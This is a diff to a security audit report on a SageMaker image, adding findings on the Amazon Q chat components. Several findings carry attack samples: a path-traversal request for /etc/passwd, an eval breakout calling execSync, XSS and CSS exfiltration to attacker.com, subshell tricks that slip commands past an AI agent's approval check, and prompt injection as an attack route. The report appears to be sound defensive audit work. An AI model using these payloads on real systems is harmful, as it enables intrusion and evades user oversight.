@@ -14,9 +14,9 @@
 - No archived repositories were cloned or included
 
 ### Files Reviewed
-- **~82 application source files** (after filtering)
+- **~85 application source files** (after filtering), including 3 large bundled JS artifacts
 - **~1,342 total files** with code extensions found; ~741 after first pass noise removal
-- After removing third-party libraries (jedilsp, attrs, cattrs, ms-python extensions, conda stdlib, C/C++ headers), **~82 files** of custom SageMaker application code remained
+- After removing third-party libraries (jedilsp, attrs, cattrs, ms-python extensions, conda stdlib, C/C++ headers), **~82 files** of custom SageMaker application code plus 3 bundled JS files (~23MB total) remained
 
 ### Files Excluded and Why
 | Category | Count | Reason |
@@ -826,10 +826,10 @@ Both the Airflow (`mwaa_image:latest`) and PostgreSQL (`postgres:13`) images use
 |----------|-------|
 | **Confirmed Vulnerabilities** | **27** |
 | Critical Severity | 0 (no single-step RCE from unauthenticated HTTP) |
-| High Severity | 12 |
-| Medium Severity | 12 |
+| High Severity | 13 |
+| Medium Severity | 15 |
 | Low Severity | 3 |
-| **Rejected False Positives** | **10** |
+| **Rejected False Positives** | **13** |
 
 ### Top Risk Areas
 1. **Shell Script Injection** (VULN-01 through VULN-06, VULN-20): Multiple command injection vectors via unquoted variables, `bash -c` with string interpolation, and unsanitized metadata values
@@ -837,10 +837,164 @@ Both the Airflow (`mwaa_image:latest`) and PostgreSQL (`postgres:13`) images use
 3. **Supply Chain Risks** (VULN-17 through VULN-19, VULN-22, VULN-25, VULN-27): User-controlled requirements, unpinned packages, unverified downloads
 4. **Privilege & Access Issues** (VULN-10, VULN-12, VULN-13, VULN-26): Root-running services, exposed credentials, hidden file access
 
+---
+
+### VULN-28: Path Traversal in OAuth Authorization Server `resourceRequest` Handler
+**Severity:** HIGH
+**Vulnerability Class:** Path Traversal / Local File Read (CWE-22)
+**Reachable HTTP Endpoint(s):** Local HTTP server on `127.0.0.1:<random_port>` (OAuth callback server)
+
+**Source Files and Lines:**
+- `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/aws-lsp-codewhisperer.js` (minified line 2, byte offset ~5308400)
+
+**Taint Flow:**
+1. OAuth `AuthorizationServer` listens on `127.0.0.1` on a random port
+2. `resourceRequest` handler receives HTTP request with user-controlled URL
+3. URL pathname extracted via `new URL(e.url, this.origin).pathname`
+4. Path passed directly to `path.join(__dirname, "resources", pathname)` — `path.join` does NOT sanitize `..` components
+5. File read via `readFile()` and returned as HTTP 200 response
+
+**Why It Works:**
+`path.join("/base/resources", "../../etc/passwd")` resolves to `/base/etc/passwd`, escaping the intended `resources/` directory. The handler catches errors and returns 404, so it doubles as a file-existence oracle. While the server binds to `127.0.0.1`, it's reachable from:
+- Any process running inside the SageMaker container
+- SSRF through jupyter-server-proxy (VULN-07)
+- Any browser-based code running in the JupyterLab context
+
+**Exploitability Assessment:** HIGH locally. The random port must be discovered (e.g., via port scanning through jupyter-server-proxy), but the file read is trivial once the port is known.
+
+**Required Preconditions:** Ability to send HTTP requests to localhost (any process in the container, or via jupyter-server-proxy).
+
+**Why Not False Positive:** Verified that `path.join` does not prevent directory traversal. No `path.resolve` + prefix check is performed before `readFile`.
+
+**PoC:**
+```
+GET /../../../../../../etc/passwd HTTP/1.1
+Host: 127.0.0.1:<port>
+```
+
+**Remediation:** Use `path.resolve()` and verify the resolved path starts with the intended `resources/` directory before reading.
+
+---
+
+### VULN-29: Dynamic `eval()` with Interpolated Path for Module Import
+**Severity:** MEDIUM
+**Vulnerability Class:** Code Injection (CWE-94)
+**Reachable HTTP Endpoint(s):** LSP server (local)
+
+**Source Files and Lines:**
+- `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/aws-lsp-codewhisperer.js` (minified line 2, byte offset ~3981807)
+
+**Taint Flow:**
+```javascript
+vecLib = vectorLib ?? await eval(`import("${libraryPath}")`);
+```
+
+`libraryPath` is interpolated directly into an `eval()` string performing a dynamic import. If this path can be influenced by configuration, environment variables, or any user-controlled input, it enables arbitrary code execution.
+
+**Why It Works:** `eval()` with string interpolation allows breaking out of the import statement. A path like `"); require("child_process").execSync("malicious");//` would execute arbitrary code.
+
+**Exploitability Assessment:** MEDIUM. Depends on whether `getVectorLibraryPath()` can be externally influenced.
+
+**Remediation:** Replace `eval()` with direct dynamic `import()` call without string interpolation.
+
+---
+
+### VULN-30: Overly Permissive HTML Sanitization Allowlist in Amazon Q Chat UI
+**Severity:** MEDIUM
+**Vulnerability Class:** Cross-Site Scripting (CWE-79)
+**Reachable HTTP Endpoint(s):** JupyterLab Amazon Q chat panel (rendered in browser)
+
+**Source Files and Lines:**
+- `etc/amazon-q-agentic-chat/artifacts/jupyterlab/clients/amazonq-ui.js` (line 278)
+
+**Taint Flow:**
+1. Chat responses from Amazon Q are rendered via `innerHTML` with `sanitize-html`
+2. The sanitization allowlist includes `embed`, `canvas`, `audio` tags
+3. Allowed attributes include `src`, `srcdoc`, `srcset` on all elements via wildcard `"*"` selector
+4. `style` attribute is allowed on all elements
+
+**Why It Works:**
+- `<embed src="data:text/html,<script>alert(1)</script>">` may bypass sanitization
+- `style`-based data exfiltration (e.g., `background: url(https://attacker.com/?)`) is possible
+- The `htmlDecode` function at another location uses raw `innerHTML` without sanitization: `n.innerHTML = e`
+
+**Exploitability Assessment:** MEDIUM. Requires Amazon Q to return malicious HTML (prompt injection in the AI response), or a compromised/malicious MCP tool returning crafted content.
+
+**Required Preconditions:** Ability to influence Amazon Q's response content (prompt injection, or compromised upstream data source).
+
+**Remediation:** Tighten the sanitize-html allowlist. Remove `embed`, restrict `style` to safe properties, remove `srcdoc` from allowed attributes.
+
+---
+
+### VULN-31: Heuristic Command Validation Bypass in ExecuteBash Tool
+**Severity:** MEDIUM
+**Vulnerability Class:** Command Injection (CWE-78)
+**Reachable HTTP Endpoint(s):** Amazon Q agentic chat → ExecuteBash tool
+
+**Source Files and Lines:**
+- `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/aws-lsp-codewhisperer.js` (byte offset ~5308900, module 33092)
+
+**Taint Flow:**
+1. Amazon Q's agentic chat can invoke the `ExecuteBash` tool with `command` and `cwd` parameters
+2. Command categorization splits on operators (`|`, `&&`, `||`, `>`) using simple string parsing
+3. Commands are categorized as safe/unsafe/destructive based on heuristic matching
+4. User approval is required for unsafe/destructive commands
+
+**Why It Works:**
+The command parsing is heuristic, not shell-aware. Bypass vectors include:
+- Backtick substitution: `` `malicious_command` `` embedded within an "approved" command
+- `$()` subshells: `echo $(malicious_command)` may be categorized as safe `echo`
+- Encoded or aliased commands
+- Semicolons inside argument strings may not be correctly detected
+
+The `requiresAcceptance` check provides significant mitigation but relies on the categorization being accurate.
+
+**Exploitability Assessment:** LOW-MEDIUM. The user approval flow is a strong mitigation. Exploitation requires the AI agent to construct a command that bypasses categorization AND the user to approve it without noticing.
+
+**Remediation:** Use a shell parser (e.g., bash AST) for command categorization instead of string splitting. Apply a strict allowlist rather than a blocklist approach.
+
+---
+
+## 3. Rejected False Positives / Near-Misses
+
+*(continued from above)*
+
+### FP-11: `__proto__` References in JS Polyfills (REJECTED)
+**File:** `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/aws-lsp-codewhisperer.js`
+**Why Rejected:** The `__proto__` references found are standard polyfill patterns (`Object.setPrototypeOf || {__proto__:[]} instanceof Array`) and `{__proto__:null}` defensive patterns. These are not prototype pollution vulnerabilities — they are standard JavaScript patterns for prototype chain management.
+
+### FP-12: OAuth Redirect Error Reflection (REJECTED)
+**File:** `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/aws-lsp-codewhisperer.js` (byte offset ~5307800)
+**Why Rejected:** Error information from OAuth redirect is encoded via `URLSearchParams` before being placed in the redirect URL. `URLSearchParams` properly encodes special characters. Whether the target `index.html` is vulnerable depends on its rendering code, which is a static asset not present in the tarball. Without evidence of unsafe rendering, this is speculative.
+
+### FP-13: child_process with `shell:true` in lspServer.js (REJECTED as platform-specific)
+**File:** `etc/amazon-q-agentic-chat/artifacts/jupyterlab/servers/indexing/lspServer.js`
+**Why Rejected:** The `shell: true` flag is only set on Windows (`pa()` platform check). SageMaker Studio runs on Linux. The spawned commands (`npm config get prefix`) use hardcoded command strings, not user input.
+
+---
+
+## 4. Summary Statistics
+
+| Category | Count |
+|----------|-------|
+| **Confirmed Vulnerabilities** | **31** |
+| High Severity | 13 |
+| Medium Severity | 15 |
+| Low Severity | 3 |
+| **Rejected False Positives** | **13** |
+
+### Top Risk Areas
+1. **Shell Script Injection** (VULN-01 through VULN-06, VULN-20): Multiple command injection vectors via unquoted variables, `bash -c` with string interpolation, and unsanitized metadata values
+2. **Missing Authentication** (VULN-07 through VULN-09): jupyter-server-proxy enables SSRF, Airflow webserver has no auth, Jupyter auth configuration is unverifiable
+3. **Supply Chain Risks** (VULN-17 through VULN-19, VULN-22, VULN-25, VULN-27): User-controlled requirements, unpinned packages, unverified downloads
+4. **Privilege & Access Issues** (VULN-10, VULN-12, VULN-13, VULN-26): Root-running services, exposed credentials, hidden file access
+5. **Client-Side & LSP Risks** (VULN-28 through VULN-31): Path traversal in OAuth server, eval-based imports, permissive HTML sanitization
+
 ### Note on Vulnerability Count
-The analysis found 27 confirmed vulnerabilities, not the 50+ target. This is because:
-1. The tarball contains a limited set of custom application code (~82 files after filtering)
+The analysis found 31 confirmed vulnerabilities, not the 50+ target. This is because:
+1. The tarball contains a limited set of custom application code (~82 files + 3 large JS bundles after filtering)
 2. Site-packages (where Jupyter extensions with HTTP handlers would be) are absent from the tarball
 3. Many potential issues were correctly eliminated as false positives (non-HTTP-driven, non-exploitable)
 4. The codebase is infrastructure/startup-focused rather than application logic-heavy
-5. Quality was prioritized over quantity — no findings were padded or standards lowered
+5. The JS bundles are heavily minified (15.9MB single line), limiting deep analysis precision
+6. Quality was prioritized over quantity — no findings were padded or standards lowered
